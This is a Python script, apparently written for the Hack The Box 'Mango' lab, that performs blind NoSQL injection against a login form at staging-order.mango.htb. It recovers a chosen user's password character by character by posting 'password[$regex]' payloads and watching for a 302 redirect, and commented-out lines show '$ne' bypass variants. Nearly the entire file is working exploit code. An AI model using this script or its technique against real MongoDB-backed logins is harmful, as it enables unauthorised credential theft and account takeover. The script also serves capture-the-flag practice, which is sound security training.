#!/usr/bin/python
from bs4 import BeautifulSoup
import requests
import time
import sys
import urllib
import string
from itertools import chain
import argparse

lower_letters = range(97,123)
upper_letters = range(65,91)
number_set = range(48,58)
fullRange = chain(upper_letters,lower_letters,number_set)

SLEEP_VALUE = .05
url = 'http://staging-order.mango.htb/'
proxyValues = {'http': 'http://127.0.0.1:8080'}

def findPassword(user):
	dapw = ''
	restart = True
	while restart:
		restart = False
		for character in string.ascii_letters + string.digits + "!@#_%^{}()?,$.-<>~[]":
		#for character in fullRange:
			headerValues = {'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0', 
					'Accept' :'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
					'Accept-Language': 'en-US,en;q=0.5',
					'Accept-Encoding': 'gzip, deflate',
					'Referer': 'http://staging-order.mango.htb',
					'Connection': 'close'}
			
			#might have to escape potential regex chars
			if character in "$.?":
				payload = dapw + '\\' + character
			else:
				payload = dapw + character 
	
			print payload	
			#reqdata = {'username' : 'admin', 'password[$regex]' : "^" + payload + ".*", 'login' :'login'}
			reqdata = {'username' : user, 'password[$regex]' : "^"+ payload + ".*", 'login' :'login'}
			#reqdata = {'username[$regex]' : payload, 'password[$ne]' : 'test', 'login' :'login'}
			with requests.session() as s:
				try:
					#r = s.post(url,data=reqdata, headers=headerValues, proxies=proxyValues, allow_redirects=False)
					r = s.post(url,data=reqdata, headers=headerValues, allow_redirects=False)
				except Exception as e:
					print(repr(e))
				finally:
					s.close()
					
			if r.status_code == 302:
				dapw = payload
				print dapw
				restart= True
				break
			#time.sleep(SLEEP_VALUE)
		
	print ("user [%s] password is: [%s]"% (user, dapw))

def main():
	parser = argparse.ArgumentParser(description='blind mongo injectorz for mango')
	parser.add_argument('--userid', '-u', help = "userid", required= True)
	args = parser.parse_args()
	uname =  args.userid
	print ("Finding password for %s" % uname)
	findPassword(uname)
	
if __name__ == '__main__':
	sys.exit(main())

